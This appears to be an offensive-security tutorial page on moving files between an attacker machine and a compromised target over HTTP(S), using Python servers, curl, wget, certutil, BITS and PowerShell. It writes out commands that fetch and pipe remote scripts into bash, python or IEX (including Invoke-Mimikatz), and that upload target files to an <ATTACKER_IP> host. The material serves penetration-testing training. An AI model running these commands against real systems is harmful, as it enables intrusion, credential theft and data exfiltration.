---
title: HTTP File Transfer
description: Learn how to transfer files from and to a compromised target using HTTP.
categories: [File Transfer]
tags: [File Transfer, HTTP]
weight: 2
---

The main advantage of using HTTP for file transfer is that it can blend into regular network traffic, especially if our attacker machine is outside the network. However, we should also note that HTTP is a plaintext protocol. If in-transit encryption is needed, we can set up HTTPS.

In this article, we will be running an HTTP(s) server on the attacker machine, as this will make our file transfer operation look like a regular web file download/upload.

## Running an HTTP Server
To create an HTTP server on the attacker machine, we can use Python's `http.server` module. By default, it starts an HTTP server on TCP port 8000.
```bash
python -m http.server
```
To specify a port other than 8000, we can simply append the port number to the command. If we wish to use port 80 or any other port lower than 1024, we need to provide elevated privileges.
```bash
sudo python -m http.server 80
```
The server serves its working directory by default. If there is no `index.html` or `index.htm`, it generates a directory listing.
```shell-session
╭─brian@A77ACk3r /tmp/http_demo
╰─$ ls -l
total 12
-rw-r--r-- 1 brian wheel 7 Jan 19 14:15 file1.txt
-rw-r--r-- 1 brian wheel 7 Jan 19 14:15 file2.txt
-rw-r--r-- 1 brian wheel 7 Jan 19 14:15 file3.txt
╭─brian@A77ACk3r /tmp/http_demo
╰─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```shell-session
╭─brian@A77ACk3r ~
╰─$ curl localhost:8000
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<style type="text/css">
:root {
color-scheme: light dark;
}
</style>
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="file1.txt">file1.txt</a></li>
<li><a href="file2.txt">file2.txt</a></li>
<li><a href="file3.txt">file3.txt</a></li>
</ul>
<hr>
</body>
</html>
╭─brian@A77ACk3r ~
╰─$ curl localhost:8000/file1.txt
File 1
```
By default, Python's `http.server` module does not have file upload capabilities. If we wish to upload files to our attacker machine from the target, we can use the `uploadserver` Python module instead, which can be installed via `pip` on Debian-based machines or the `python-uploadserver` AUR package for Arch Linux.

The command syntax of `uploadserver` is similar to `http.server`.
```bash
python -m uploadserver
```
```bash
sudo python -m uploadserver 80
```
### Running an HTTPS Server
The Python module `uploadserver` also provides HTTPS functionality. To set up an HTTPS server using this module, we have to first generate a self-signed TLS certificate using `openssl`.
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
For security, put the PEM file, which also contains the private key, somewhere outside the directory you wish to serve. Create the destination directory first if needed.
```shell-session
╭─brian@A77ACk3r /tmp/http_demo
╰─$ mv server.pem ~/ssl_cert/server.pem
```
To launch `uploadserver` with HTTPS, use the `--server-certificate` argument to specify the path to the TLS certificate we just generated.
```bash
sudo python -m uploadserver 443 --server-certificate ~/ssl_cert/server.pem
```

## HTTP File Transfer
Both Linux and Windows provide us with utilities to transfer files via HTTP(s).

### HTTP File Transfer on Linux
On Linux, `Wget` and `cURL` may be used to download files via HTTP(s).

#### cURL
**cURL** is a tool to make HTTP requests, including those that can be used to download files with the `-o` option specifying the output file path.
```bash
curl http://<ATTACKER_IP>[:PORT]/file -o <OUTPUT_PATH>
```
If we do not wish to explicitly save a script to a file on disk, we can `curl` the script we wish to run and pipe it into the appropriate interpreter. This does not guarantee that AV or EDR will not detect it. The following example runs a Bash script **filelessly**:
```bash
curl http://<ATTACKER_IP>/LinEnum.sh | bash
```
We can also use `curl` to upload a file to the attacker machine. Make sure your HTTP server can handle file uploads. Multiple files can be specified by repeating `-F 'files=@<FILE_PATH>'` when using `uploadserver`.
```bash
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE_PATH>'
```
If you are running an HTTPS server with a self-signed certificate, `--insecure` disables certificate verification. This leaves the connection vulnerable to impersonation; prefer trusting the certificate with `--cacert` and using a URL that matches its identity.
```bash
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE_PATH>' --insecure
```

#### Wget
**Wget** is used mostly to download files over the web on the command line.
```bash
wget http://<ATTACKER_IP>[:PORT]/file
```
By default, `wget` downloads the file to the current directory. Use `-O` to specify an alternative file output path. This might be useful if we only have a webshell or non-interactive command execution.

```bash
wget http://<ATTACKER_IP>[:PORT]/file -O <OUTPUT_PATH>
```

Similarly, `wget` can also be used to run scripts without explicitly writing the script to disk:
```bash
wget -qO- http://<ATTACKER_IP>/helloworld.py | python3
```

### HTTP File Download on Windows
There are multiple ways, using standalone programs, PowerShell methods or cmdlets, to download files over HTTP(s) on Windows.

#### certutil.exe
Certutil is a Windows certificate utility whose `-URLCache` option can also fetch a URL. The `-f` option forces a fresh fetch, and `-split` saves retrieved content to a file. This should not be confused with a guarantee that the download will evade security monitoring.
```cmd
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/file
```

#### BITS
The **Background Intelligent Transfer Service (BITS)** can be used to download files from HTTP sites and SMB shares.
```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**BITS** can also be used with PowerShell syntax:
```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### PowerShell DownloadFile/DownloadFileAsync
The PowerShell methods `DownloadFile` and `DownloadFileAsync` both belong to the .NET class `System.Net.WebClient`. They perform similar functions.

The `DownloadFile` method blocks until the download completes.
```ps
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
The `DownloadFileAsync` method starts an asynchronous download and returns without waiting for completion. Keep the client and PowerShell session alive until the transfer completes; returning from this call does not mean the file is ready.
```ps
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### PowerShell IEX DownloadString
The `DownloadString` method retrieves a script as a string, and PowerShell's `Invoke-Expression` cmdlet (alias `IEX`) executes it without explicitly saving the script to disk. This does not bypass script scanning such as AMSI:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz.ps1')
```

The `IEX` alias also accepts pipelined input:
```powershell
(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz.ps1') | IEX
```

#### PowerShell Invoke-WebRequest
Invoke-WebRequest allows files to be downloaded like `curl` or `wget` on Linux.
```powershell
Invoke-WebRequest "http://<ATTACKER_IP>[:PORT]/file" -OutFile <OUTPUT_PATH>
```
Alternatively, use the `iwr` alias:
```powershell
iwr -uri "http://<ATTACKER_IP>[:PORT]/file" -OutFile <OUTPUT_PATH>
```

#### PowerShell Web Uploads
`Invoke-WebRequest` and `Invoke-RestMethod` support HTTP uploads. PowerShell 7 supports multipart uploads with `-Form`; for Windows PowerShell, a helper script can construct the multipart request.

We can use [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1), which uses `Invoke-RestMethod` to perform the upload operation. The script accepts two parameters:
- `-File`: used to specify the file path
- `-Uri`: the URL where the file will be uploaded.

```PowerShell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri "http://<ATTACKER_IP>/upload" -File <FILE_PATH>
```
